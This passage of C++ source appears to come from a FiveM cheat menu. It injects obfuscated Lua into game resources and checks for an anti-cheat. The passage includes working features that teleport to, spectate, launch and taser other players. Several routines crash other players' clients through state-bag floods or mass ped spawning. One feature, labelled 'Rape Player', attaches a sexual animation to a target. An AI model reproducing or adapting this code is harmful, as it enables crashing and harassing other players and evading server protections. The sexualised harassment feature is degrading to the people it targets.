                                RenderScriptCams(false, false, 0, true, true)
                                if _G.SouthCam then
                                    DestroyCam(_G.SouthCam, true)
                                    _G.SouthCam = nil
                                end
                                Citizen.Wait(250)
                                SetEntityVisible(p, true, false)
                                SetEntityCollision(p, true, true)
                                FreezeEntityPosition(p, false)
                                break
                            end -- active
                        end -- while
                    end) -- inner CreateThread (camera loop)
                    end) -- outer CreateThread (setup + camera init)
                else
                    _G.SouthFreeCamActive = true
                    _G.SouthFreeCamFeatureIdx = SOUTH_CURRENT_FEATURE_VAL
                    _G.curIdx = SOUTH_CURRENT_FEATURE_VAL
                end
            )lua";

            size_t sPos;
            while ((sPos = scriptRaw.find("SOUTH_FREECAM_SPEED_VAL")) != std::string::npos) { scriptRaw.replace(sPos, 21, sVal); }
            while ((sPos = scriptRaw.find("SOUTH_CURRENT_FEATURE_VAL")) != std::string::npos) { scriptRaw.replace(sPos, 23, fVal); }

            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + scriptRaw + "]])", resources);
        } catch (...) {}
    }

    static void SetFreecamFeature(int featureIdx) {

    }

    static void ChangePedModel(const std::string& modelName) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            std::string code = R"lua(
                local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                local selected = [===[)lua" + modelName + R"lua(]===]
                local pedMap = {
                    ["Freemode Male"] = "mp_m_freemode_01",
                    ["Freemode Female"] = "mp_f_freemode_01",
                    ["Michael"] = "player_zero",
                    ["Franklin"] = "player_one",
                    ["Trevor"] = "player_two",
                    ["Lamar"] = "ig_lamardavis",
                    ["Jimmy"] = "ig_jimmydisanto",
                    ["Amanda"] = "ig_amandatownley",
                    ["Tracey"] = "ig_tracydisanto",
                    ["Ron"] = "ig_ronsch",
                    ["Wade"] = "ig_wade",
                    ["Dave Norton"] = "ig_davenorton",
                    ["Steve Haines"] = "ig_stevehains",
                    ["Devin Weston"] = "ig_devin",
                    ["Floyd"] = "ig_floyd",
                    ["Chef"] = "ig_chef",
                    ["Lester"] = "ig_lestercrest",
                    ["Chop"] = "a_c_chop",
                    ["Brad"] = "ig_brad",
                    ["Police Officer Male"] = "s_m_y_cop_01",
                    ["Police Officer Female"] = "s_f_y_cop_01",
                    ["SWAT"] = "s_m_y_swat_01",
                    ["Sheriff Male"] = "s_m_y_sheriff_01",
                    ["Sheriff Female"] = "s_f_y_sheriff_01",
                    ["Highway Cop"] = "s_m_y_hwaycop_01",
                    ["FIB Male"] = "s_m_m_fibsec_01",
                    ["FIB Female"] = "s_f_m_fiboffice_02",
                    ["Paramedic"] = "s_m_m_paramedic_01",
                    ["Firefighter"] = "s_m_y_fireman_01",
                    ["Doctor"] = "s_m_m_doctor_01",
                    ["Construction Worker"] = "s_m_y_construct_01",
                    ["Pilot Male"] = "s_m_m_pilot_02",
                    ["Pilot Female"] = "s_f_y_airhostess_01",
                    ["Business Male"] = "s_m_y_business_01",
                    ["Business Female"] = "s_f_y_business_01",
                    ["Street Dealer"] = "g_m_y_mexgoon_02",
                    ["Gang Male 1"] = "g_m_y_ballaorig_01",
                    ["Gang Male 2"] = "g_m_y_ballasout_01",
                    ["Gang Female 1"] = "g_f_y_ballas_01",
                    ["Ballas 1"] = "g_m_y_ballaeast_01",
                    ["Ballas 2"] = "g_m_y_ballasout_01",
                    ["Ballas Female"] = "g_f_y_ballas_01",
                    ["Families 1"] = "g_m_y_famca_01",
                    ["Families 2"] = "g_m_y_famdnf_01",
                    ["Vagos 1"] = "g_m_y_mexgoon_01",
                    ["Vagos 2"] = "g_m_y_mexgoon_03",
                    ["Lost MC 1"] = "g_m_y_lost_01",
                    ["Lost MC 2"] = "g_m_y_lost_02",
                    ["Lost MC Female"] = "g_f_y_lost_01",
                    ["Army Soldier"] = "s_m_y_marine_01",
                    ["Marine 1"] = "s_m_y_marine_02",
                    ["Marine 2"] = "s_m_y_marine_03",
                    ["Prisoner Male"] = "s_m_y_prismuscl_01",
                    ["Prison Guard"] = "s_m_m_prisguard_01",
                    ["Cop Undercover"] = "s_m_m_ciasec_01",
                    ["Security Guard"] = "s_m_m_security_01",
                    ["Janitor"] = "s_m_m_janitor",
                    ["Hobo Male"] = "a_m_m_tramp_01",
                    ["Hobo Female"] = "a_f_m_tramp_01",
                    ["Prostitute 1"] = "s_f_y_hooker_01",
                    ["Prostitute 2"] = "s_f_y_hooker_02",
                    ["Beach Male"] = "a_m_y_beach_01",
                    ["Beach Female"] = "a_f_y_beach_01",
                    ["Tourist Male"] = "a_m_y_tourist_01",
                    ["Tourist Female"] = "a_f_y_tourist_01",
                    ["Skater"] = "a_m_y_skater_01",
                    ["Hipster Male"] = "a_m_y_hipster_01",
                    ["Hipster Female"] = "a_f_y_hipster_01",
                    ["Bouncer"] = "s_m_m_bouncer_01",
                    ["Shopkeeper"] = "mp_m_shopkeep_01",
                    ["Chef"] = "s_m_y_chef_01",
                    ["Bartender"] = "s_m_y_barman_01",
                    ["Waiter"] = "s_m_y_waiter_01",
                    ["Mechanic"] = "s_m_y_xmech_02",
                    ["Taxi Driver"] = "s_m_m_trucker_01",
                    ["Gardener"] = "s_m_m_gardener_01",
                    ["Farmer"] = "a_m_m_farmer_01",
                    ["Dock Worker"] = "s_m_y_dockwork_01",
                    ["Trash Worker"] = "s_m_y_garbage",
                    ["Postal Worker"] = "s_m_m_postal_01",
                    ["Bus Driver"] = "s_m_o_busker_01",
                    ["Pilot"] = "s_m_m_pilot_01",
                    ["Air Hostess"] = "s_f_y_airhostess_01",
                    ["Cop Traffic"] = "s_m_y_hwaycop_01",
                    ["Cop Detective"] = "s_m_m_ciasec_01",
                    ["Agent"] = "s_m_m_fiboffice_02",
                    ["Reporter"] = "s_f_y_scrubs_01",
                    ["News Cameraman"] = "s_m_m_pilot_02",
                    ["Hunter"] = "a_m_m_hillbilly_02",
                    ["Hiker Male"] = "a_m_m_hiker_01",
                    ["Hiker Female"] = "a_f_m_hiker_01",
                    ["Golfer Male"] = "a_m_m_golfer_01",
                    ["Golfer Female"] = "a_f_m_golfer_01",
                    ["Tennis Player Male"] = "a_m_m_tennis_01",
                    ["Tennis Player Female"] = "a_f_m_tennis_01",

                    -- Animals
                    ["Boar"] = "a_c_boar", ["Boar2"] = "a_c_boar",
                    ["Cat"] = "a_c_cat_01", ["Cat2"] = "a_c_cat_01",
                    ["Chicken"] = "a_c_hen",
                    ["Chimp"] = "a_c_chimp", ["Chimp2"] = "a_c_chimp",
                    ["Cow"] = "a_c_cow",
                    ["Coyote"] = "a_c_coyote", ["Coyote2"] = "a_c_coyote",
                    ["Crow"] = "a_c_crow",
                    ["Deer"] = "a_c_deer", ["Deer2"] = "a_c_deer",
                    ["Dolphin"] = "a_c_dolphin", ["Dolphin2"] = "a_c_dolphin",
                    ["Fish"] = "a_c_fish", ["Fish2"] = "a_c_fish",
                    ["Hen"] = "a_c_hen",
                    ["Humpback"] = "a_c_humpback",
                    ["Husky"] = "a_c_husky", ["Husky2"] = "a_c_husky",
                    ["Killer Whale"] = "a_c_killerwhale", ["Killer Whale2"] = "a_c_killerwhale",
                    ["Mountain Lion"] = "a_c_mtlion", ["Mountain Lion2"] = "a_c_mtlion",
                    ["Pig"] = "a_c_pig", ["Pig2"] = "a_c_pig",
                    ["Pigeon"] = "a_c_pigeon",
                    ["Poodle"] = "a_c_poodle", ["Poodle2"] = "a_c_poodle",
                    ["Pug"] = "a_c_pug", ["Pug2"] = "a_c_pug",
                    ["Rabbit"] = "a_c_rabbit_01", ["Rabbit2"] = "a_c_rabbit_01",
                    ["Rat"] = "a_c_rat", ["Rat2"] = "a_c_rat",
                    ["Retriever"] = "a_c_retriever", ["Retriever2"] = "a_c_retriever",
                    ["Rhesus Monkey"] = "a_c_rhesus",
                    ["Rottweiler"] = "a_c_rottweiler",
                    ["Seagull"] = "a_c_seagull", ["Seagull2"] = "a_c_seagull",
                    ["Shepherd"] = "a_c_shepherd", ["Shepherd2"] = "a_c_shepherd",
                    ["Stingray"] = "a_c_stingray", ["Stingray2"] = "a_c_stingray",
                    ["Tiger Shark"] = "a_c_sharktiger", ["Tiger Shark2"] = "a_c_sharktiger",
                    ["Hammerhead Shark"] = "a_c_sharkhammer", ["Hammerhead Shark2"] = "a_c_sharkhammer",
                    ["Chickenhawk"] = "a_c_chickenhawk",
                    ["Cormorant"] = "a_c_cormorant"
                }

                local pedModel = pedMap[selected]
                if pedModel then
                    _g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                        local requestModel = _g({82,101,113,117,101,115,116,77,111,100,101,108})
                        local hasModelLoaded = _g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})
                        local wait_fn = _g({87,97,105,116})
                        local setPlayerModel = _g({83,101,116,80,108,97,121,101,114,77,111,100,101,108})
                        local setModelAsNoLongerNeeded = _g({83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100})
                        local playerPedId = _g({80,108,97,121,101,114,80,101,100,73,100})
                        local playerId = _g({80,108,97,121,101,114,73,100})
                        local setDefaultComp = _g({83,101,116,80,101,100,68,101,102,97,117,108,116,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})
                        local setRandomComp = _g({83,101,116,80,101,100,82,97,110,100,111,109,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})
                        local setRandomProps = _g({83,101,116,80,101,100,82,97,110,100,111,109,80,114,111,112,115})
                        local setInvincible = _g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})
                        local clearTasks = _g({67,108,101,97,114,80,101,100,84,97,115,107,115,73,109,109,101,100,105,97,116,101,108,121})
                        local getHash = _g({71,101,116,72,97,115,104,75,101,121})
                        local gameTimer = _g({71,101,116,71,97,109,101,84,105,109,101,114})

                        local modelHash = getHash(pedModel)
                        requestModel(modelHash)
                        local startTime = gameTimer()
                        while not hasModelLoaded(modelHash) do
                            wait_fn(0)
                            if gameTimer() - startTime > 3000 then
                                break
                            end
                        end

                        if hasModelLoaded(modelHash) then
                            setPlayerModel(playerId(), modelHash)
                            setModelAsNoLongerNeeded(modelHash)

                            local playerPed = playerPedId()
                            setDefaultComp(playerPed)
                            setInvincible(playerPed, false)
                            clearTasks(playerPed)
                        end
                    end)
                end
            )lua";

            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
        } catch (...) {}
    }

    static void ApplyRandomOutfit() {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);

            std::string code = R"lua(
                local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                _g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                    local playerPedId = _g({80,108,97,121,101,114,80,101,100,73,100})
                    local setPedComp = _g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})
                    local setBlend = _g({83,101,116,80,101,100,72,101,97,100,66,108,101,110,100,68,97,116,97})
                    local setHairCol = _g({83,101,116,80,101,100,72,97,105,114,67,111,108,111,114})
                    local clearProp = _g({67,108,101,97,114,80,101,100,80,114,111,112})

                    local ped = playerPedId()
                    setPedComp(ped, 11, math.random(0, 30), 0, 2)
                    setPedComp(ped, 6, math.random(0, 15), 0, 2)
                    setPedComp(ped, 8, 15, 0, 2)
                    setPedComp(ped, 3, 0, 0, 2)
                    setPedComp(ped, 4, math.random(0, 30), 0, 2)

                    local face = math.random(0, 45)
                    local skin = math.random(0, 45)
                    setBlend(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                    setPedComp(ped, 2, math.random(0, 15), 0, 2)
                    setHairCol(ped, math.random(0, 10), 0)

                    clearProp(ped, 0)
                    clearProp(ped, 1)
                end)
            )lua";

            ::ProcessMachoCommands("MachoInjectResource(\"" + target + "\", [[" + code + "]])", resources);
        } catch (...) {}
    }

    static void ExecutePlayerAction(int serverId, const std::string& actionName, bool state = false) {
        try {
            auto rm = fx::ResourceManager::getCurrentIl(); if (!rm) return;
            auto resources = rm->getAllResources();
            std::string target = GetTargetResource(resources);
            bool isWS = IsWaveShieldStarted(resources);

            std::string code;
            if (actionName == "Teleport to Player") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local targetPlayer = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)
                    if targetPlayer and targetPlayer ~= -1 then
                        local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(targetPlayer)
                        if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) then
                            local me = _g({80,108,97,121,101,114,80,101,100,73,100})()
                            local originalPos = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(me)
                            local wasVisible = _g({73,115,69,110,116,105,116,121,86,105,115,105,98,108,101})(me)
                            local coords = _g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(targetPed)

                            _g({83,101,116,69,110,116,105,116,121,86,105,115,105,98,108,101})(me, false, false)
                            _g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(me, true)
                            _g({83,101,116,69,110,116,105,116,121,67,111,108,108,105,115,105,111,110})(me, false, false)
                            _g({70,114,101,101,122,101,69,110,116,105,116,121,80,111,115,105,116,105,111,110})(me, true)
                            _g({87,97,105,116})(0)

                            if _g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})(me, false) then
                                local veh = _g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(me, false)
                                if veh and veh ~= 0 then
                                    _g({83,101,116,69,110,116,105,116,121,67,111,111,114,100,115,78,111,79,102,102,115,101,116})(veh, coords.x, coords.y, coords.z, true, true, true)
                                else
                                    _g({83,101,116,69,110,116,105,116,121,67,111,111,114,100,115,78,111,79,102,102,115,101,116})(me, coords.x, coords.y, coords.z, true, true, true)
                                end
                            else
                                _g({83,101,116,69,110,116,105,116,121,67,111,111,114,100,115,78,111,79,102,102,115,101,116})(me, coords.x, coords.y, coords.z, true, true, true)
                            end

                            _g({87,97,105,116})(50)
                            _g({70,114,101,101,122,101,69,110,116,105,116,121,80,111,115,105,116,105,111,110})(me, false)
                            _g({83,101,116,69,110,116,105,116,121,67,111,108,108,105,115,105,111,110})(me, true, true)
                            _g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(me, false)
                            _g({83,101,116,69,110,116,105,116,121,86,105,115,105,98,108,101})(me, wasVisible, false)
                        end
                    end
                )lua";
            }
            else if (actionName == "Spectate Player") {
                spectateActive = state;
                spectateTargetSid = serverId;
                code = GetSpectateLuaScript(isWS, serverId, state);
            }
            else if (actionName == "Copy Appearance") {
                code = R"lua(
                    local function _d(t) local s = "" for i = 1, #t do s = s .. string.char(t[i]) end return s end
                    local function _g(n) return _G[_d(n)] or function(...) return Citizen.InvokeNative(GetHashKey(_d(n)), ...) end end

                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local targetPlayer = _g({71,101,116,80,108,97,121,101,114,70,114,111,109,83,101,114,118,101,114,73,100})(targetSid)
                    if targetPlayer and targetPlayer ~= -1 then
                        local targetPed = _g({71,101,116,80,108,97,121,101,114,80,101,100})(targetPlayer)
                        local myPed = _g({80,108,97,121,101,114,80,101,100,73,100})()
                        if _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(targetPed) and _g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(myPed) then
                            for i = 0, 11 do
                                _g({83,101,116,80,101,100,67,111,109,112,111,110,101,110,116,86,97,114,105,97,116,105,111,110})(myPed, i, _g({71,101,116,80,101,100,68,114,97,119,97,98,108,101,86,97,114,105,97,116,105,111,110})(targetPed, i), _g({71,101,116,80,101,100,84,101,120,116,117,114,101,86,97,114,105,97,116,105,111,110})(targetPed, i), 0)
                            end
                            for i = 0, 2 do
                                _g({83,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(myPed, i, _g({71,101,116,80,101,100,80,114,111,112,73,110,100,101,120})(targetPed, i), _g({71,101,116,80,101,100,80,114,111,112,84,101,120,116,117,114,101,73,110,100,101,120})(targetPed, i), true)
                            end
                        end
                    end
                )lua";
            }
            else if (actionName == "Launch Player") {
                code = R"lua(
                    local targetId = )lua" + std::to_string(serverId) + R"lua(

                    local targetServerId = tonumber(targetId)
                    local clientId = GetPlayerFromServerId(targetServerId)

                    if clientId ~= -1 then
                        local targetPed = GetPlayerPed(clientId)
                        if DoesEntityExist(targetPed) then
                            if IsPedInAnyVehicle(targetPed, false) then
                                return
                            end

                            local coords = GetEntityCoords(targetPed)
                            
                            local function SafeWrap(setFunc)
                                return function(...)
                                    return setFunc(...)
                                end
                            end

                            local SafeThread = SafeWrap(CreateThread)
                            local SafeCVehicle = SafeWrap(CreateVehicle)

                            SafeThread(function()
                                local vehicleHash = GetHashKey("mule2")
                                RequestModel(vehicleHash)
                                local startTime = GetGameTimer()
                                while not HasModelLoaded(vehicleHash) and GetGameTimer() - startTime < 5000 do
                                    Wait(50)
                                end

                                if not HasModelLoaded(vehicleHash) then return end

                                local veh = SafeCVehicle(vehicleHash, coords.x, coords.y, coords.z, 50.0, true, true, false)
                                if not DoesEntityExist(veh) then return end

                                SetEntityVisible(veh, false, false)
                                SetEntityRotation(veh, 270.0, 0.0, 0.0, 2, true)
                                SetEntityCoordsNoOffset(veh, coords.x, coords.y, coords.z - 2.0, false, false, false)

                                SetEntityVelocity(veh, 0.0, 0.0, 5.0)
                                local targetHeight = coords.z + 3000.0
                                local loopStart = GetGameTimer()
                                while DoesEntityExist(veh) and GetGameTimer() - loopStart < 30000 do
                                    local vehCoords = GetEntityCoords(veh)
                                    if vehCoords.z >= targetHeight then break end

                                    SetEntityRotation(veh, 270.0, 0.0, 0.0, 2, true)
                                    SetEntityVelocity(veh, 0.0, 0.0, 12.0)
                                    Wait(30)
                                end
                                Wait(1000)
                                DeleteEntity(veh)
                            end)
                        end
                    end
                )lua";
            }
            else if (actionName == "Launch To Sky (Vehicle)") {
                code = "local targetServerId = " + std::to_string(serverId) + "\n" + R"lua(
Citizen.CreateThread(function()
    local myPed = PlayerPedId()
    local player = GetPlayerFromServerId(targetServerId)
    
    if player ~= -1 then
        local targetPed = GetPlayerPed(player)
        if targetPed and DoesEntityExist(targetPed) then
            local vehicle = GetVehiclePedIsIn(targetPed, false)
            if vehicle == 0 or not DoesEntityExist(vehicle) then
                vehicle = GetVehiclePedIsUsing(targetPed)
            end

            if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                local originalCoords = GetEntityCoords(myPed)

                SetPedIntoVehicle(myPed, vehicle, 0)
                Citizen.Wait(100)

                NetworkRequestControlOfEntity(vehicle)
                local reqTimeout = 2000
                while not NetworkHasControlOfEntity(vehicle) and reqTimeout > 0 do
                    NetworkRequestControlOfEntity(vehicle)
                    Citizen.Wait(10)
                    reqTimeout = reqTimeout - 10
                end

                Citizen.CreateThread(function()
                    local forceUp = 500.0
                    while DoesEntityExist(vehicle) do
                        NetworkRequestControlOfEntity(vehicle)
                        
                        SetEntityCollision(vehicle, false, true)
                        
                        ApplyForceToEntity(vehicle, 1, 0.0, 0.0, forceUp, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                        Citizen.Wait(50)
                    end
                end)

                Citizen.Wait(200)

                SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
            end
        end
    end
end)
                )lua";
            }
            else if (actionName == "Fall To Void (Vehicle)") {
                code = "local targetServerId = " + std::to_string(serverId) + "\n" + R"lua(
Citizen.CreateThread(function()
    local myPed = PlayerPedId()
    local player = GetPlayerFromServerId(targetServerId)
    
    if player ~= -1 then
        local targetPed = GetPlayerPed(player)
        if targetPed and DoesEntityExist(targetPed) then
            local vehicle = GetVehiclePedIsIn(targetPed, false)
            if vehicle == 0 or not DoesEntityExist(vehicle) then
                vehicle = GetVehiclePedIsUsing(targetPed)
            end

            if vehicle and vehicle ~= 0 and DoesEntityExist(vehicle) then
                local originalCoords = GetEntityCoords(myPed)

                SetPedIntoVehicle(myPed, vehicle, 0)
                Citizen.Wait(100)

                NetworkRequestControlOfEntity(vehicle)
                local reqTimeout = 2000
                while not NetworkHasControlOfEntity(vehicle) and reqTimeout > 0 do
                    NetworkRequestControlOfEntity(vehicle)
                    Citizen.Wait(10)
                    reqTimeout = reqTimeout - 10
                end

                Citizen.CreateThread(function()
                    while DoesEntityExist(vehicle) do
                        NetworkRequestControlOfEntity(vehicle)
                        
                        SetEntityCollision(vehicle, false, true)
                        
                        Citizen.Wait(50)
                    end
                end)

                Citizen.Wait(200)

                SetEntityCoords(myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false, false)
            end
        end
    end
end)
                )lua";
            }
            else if (actionName == "Heal Player") {
                code = R"lua(
                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local targetPlayer = GetPlayerFromServerId(targetSid)
                    if targetPlayer and targetPlayer ~= -1 then
                        local targetPed = GetPlayerPed(targetPlayer)
                        if DoesEntityExist(targetPed) then
                            local coords = GetEntityCoords(targetPed)
                            local model = "xm_prop_x17_med_bag_01a"
                            RequestModel(model)
                            while not HasModelLoaded(model) do Wait(0) end
                            local obj = CreateObject(GetHashKey(model), coords.x, coords.y, coords.z, true, true, false)
                            if DoesEntityExist(obj) then
                                NetworkRegisterEntityAsNetworked(obj)
                                local netId = ObjToNet(obj)
                                SetNetworkIdExistsOnAllMachines(netId, true)
                                SetNetworkIdCanMigrate(netId, true)
                                PlaceObjectOnGroundProperly(obj)
                                SetEntityHealth(targetPed, GetEntityMaxHealth(targetPed))
                                Wait(1000)
                                DeleteObject(obj)
                            end
                            SetModelAsNoLongerNeeded(model)
                        end
                    end
                )lua";
            }
            else if (actionName == "Give Armour") {
                code = R"lua(
                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local targetPlayer = GetPlayerFromServerId(targetSid)
                    if targetPlayer and targetPlayer ~= -1 then
                        local targetPed = GetPlayerPed(targetPlayer)
                        if DoesEntityExist(targetPed) then
                            local coords = GetEntityCoords(targetPed)
                            local model = "prop_armour_pickup"
                            RequestModel(model)
                            while not HasModelLoaded(model) do Wait(0) end
                            local obj = CreateObject(GetHashKey(model), coords.x, coords.y, coords.z, true, true, false)
                            if DoesEntityExist(obj) then
                                NetworkRegisterEntityAsNetworked(obj)
                                local netId = ObjToNet(obj)
                                SetNetworkIdExistsOnAllMachines(netId, true)
                                SetNetworkIdCanMigrate(netId, true)
                                PlaceObjectOnGroundProperly(obj)
                                SetPedArmour(targetPed, 100)
                                Wait(1000)
                                DeleteObject(obj)
                            end
                            SetModelAsNoLongerNeeded(model)
                        end
                    end
                )lua";
            }
            else if (actionName == "Crash Player (StateBag)") {
                code = R"lua(
                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local player = GetPlayerFromServerId(targetSid)
                    if player ~= -1 then
                        for i = 1, 100 do
                            RemoveStateBagChangeHandler(i)
                        end
                        Wait(100)
                        local haha = {
                            ['pos'] = 'vec3(0.000000, 0.000000, 0.000000)',
                            ['rot'] = 'vec3(0.000000, 0.000000, 0.000000)',
                            ['model'] = "p_spinning_anus_s",
                            ['bone'] = 0
                        }
                        local haha2 = {}
                        for i = 1, 600 do
                            haha2[i] = haha
                        end
                        local payload = msgpack.pack(haha2)
                        SetStateBagValue("player:" .. targetSid, "lib:progressProps", payload, #payload, true)
                    end
                )lua";
            }
            else if (actionName == "Crash Player (OxLib)") {
                code = R"lua(
                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local player = GetPlayerFromServerId(targetSid)
                    if player ~= -1 then
                        local props = {}
                        for i = 1, 600 do
                            props[i] = {
                                model = 'p_spinning_anus_s',
                                coords = vec3(0.0, 0.0, 0.0),
                                pos = vec3(0.0, 0.0, 0.0),
                                rot = vec3(0.0, 0.0, 0.0)
                            }
                        end
                        local plyState = LocalPlayer.state
                        plyState:set('lib:progressProps', props, true)
                        Wait(1000)
                        plyState:set('lib:progressProps', nil, true)
                    end
                )lua";
            }
            else if (actionName == "Crash Player (Ped)") {
                code = R"lua(
                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local player = GetPlayerFromServerId(targetSid)
                    if player ~= -1 then
                        local targetPed = GetPlayerPed(player)
                        if DoesEntityExist(targetPed) then
                            local pedModel = GetHashKey("cs_wade")
                            RequestModel(pedModel)
                            while not HasModelLoaded(pedModel) do
                                Citizen.Wait(10)
                            end
                            local spawnedPeds = {}
                            local maxPedsPerBatch = 5
                            local maxIterations = 22
                            for i = 0, maxIterations - 1 do
                                local coords = GetEntityCoords(targetPed)
                                if coords then
                                    for j = 1, maxPedsPerBatch do
                                        local ped = CreatePed(28, pedModel, coords.x, coords.y, coords.z, 0.0, true, false)
                                        if DoesEntityExist(ped) then
                                            SetEntityAlpha(ped, 0, false)
                                            SetEntityVisible(ped, false, false)
                                            AttachEntityToEntity(ped, targetPed, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, false, true, 2, true)
                                            FreezeEntityPosition(ped, true)
                                            SetEntityCompletelyDisableCollision(ped, false, false)
                                            SetEntityCollision(ped, false, false)
                                            SetPedConfigFlag(ped, 292, true)
                                            SetPedConfigFlag(ped, 301, true)
                                            SetPedConfigFlag(ped, 128, true)
                                            SetPedConfigFlag(ped, 287, true)
                                            SetEntityCanBeDamaged(ped, false)
                                            SetEntityInvincible(ped, true)
                                            SetEntityProofs(ped, true, true, true, true, true, true, true, true)
                                            SetPedCanRagdoll(ped, false)
                                            SetPedCanRagdollFromPlayerImpact(ped, false)
                                            SetBlockingOfNonTemporaryEvents(ped, true)
                                            SetPedFleeAttributes(ped, 0, false)
                                            SetPedCombatAttributes(ped, 46, false)
                                            table.insert(spawnedPeds, ped)
                                        end
                                    end
                                end
                                Citizen.Wait(100)
                            end
                            SetModelAsNoLongerNeeded(pedModel)
                            Citizen.CreateThread(function()
                                Citizen.Wait(3000)
                                for _, ped in ipairs(spawnedPeds) do
                                    if DoesEntityExist(ped) then
                                        DeleteEntity(ped)
                                        if DoesEntityExist(ped) then DeletePed(ped) end
                                    end
                                end
                            end)
                        end
                    end
                )lua";
            }
            else if (actionName == "Tazer Player") {
                code = R"lua(
                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local player = GetPlayerFromServerId(targetSid)
                    if player ~= -1 then
                        local weaponHash = GetHashKey("WEAPON_STUNGUN")
                        local playerPed = PlayerPedId()
                        local targetPed = GetPlayerPed(player)
                        if targetPed and targetPed ~= playerPed and not IsPedDeadOrDying(targetPed, true) then
                            local headCoords = GetPedBoneCoords(targetPed, 31086)
                            if headCoords then
                                local direction = headCoords - GetEntityCoords(playerPed)
                                local offset = 0.5
                                local normalizedDirection = direction / #(direction)
                                local offsetPosition = headCoords - (normalizedDirection * offset)
                                ShootSingleBulletBetweenCoords(
                                    offsetPosition.x, offsetPosition.y, offsetPosition.z,
                                    headCoords.x, headCoords.y, headCoords.z,
                                    0, true, weaponHash, playerPed, true, false, -1
                                )
                            end
                        end
                    end
                )lua";
            }
            else if (actionName == "Rape Player") {
                code = R"lua(
                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local player = GetPlayerFromServerId(targetSid)
                    if player ~= -1 then
                        local rmodel = "a_m_o_acult_01"
                        local ped = GetPlayerPed(player)
                        local coords = GetOffsetFromEntityInWorldCoords(ped, 0.0, 8.0, 0.5)
                        RequestModel(GetHashKey(rmodel))
                        RequestAnimDict("rcmpaparazzo_2")
                        local timeout = 0
                        while not HasModelLoaded(GetHashKey(rmodel)) and timeout < 100 do
                            Wait(10)
                            timeout = timeout + 1
                        end
                        timeout = 0
                        while not HasAnimDictLoaded("rcmpaparazzo_2") and timeout < 100 do
                            Wait(10)
                            timeout = timeout + 1
                        end
                        local nped = CreatePed(31, rmodel, coords.x, coords.y, coords.z, 0.0, true, true)
                        SetPedComponentVariation(nped, 4, 0, 0, 0)
                        SetPedKeepTask(nped)
                        TaskPlayAnim(nped, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 16, 0, 0)
                        AttachEntityToEntity(nped, ped, 0, 0.0, -0.3, 0.0, 0.0, 0.0, 0.0, true, true, true, true, 0, true)
                    end
                )lua";
            }
            else if (actionName == "Block Jumping") {
                code = R"lua(
                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local player = GetPlayerFromServerId(targetSid)
                    if player ~= -1 then
                        local ped = GetPlayerPed(player)
                        local clonePed = ClonePed(ped, 0.0, false, true)
                        SetEntityVisible(clonePed, false, false)
                        SetEntityInvincible(clonePed, true)
                        FreezeEntityPosition(clonePed, true)
                        AttachEntityToEntity(clonePed, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    end
                )lua";
            }
            else if (actionName == "Send to Void") {
                code = R"lua(
                    local targetSid = )lua" + std::to_string(serverId) + R"lua(
                    local player = GetPlayerFromServerId(targetSid)
                    if player ~= -1 then
                        local ped = GetPlayerPed(player)
                        local coords = GetEntityCoords(ped)
                        SetEntityCoords(ped, coords.x, coords.y, -500.0, false, false, false, false)
                    end
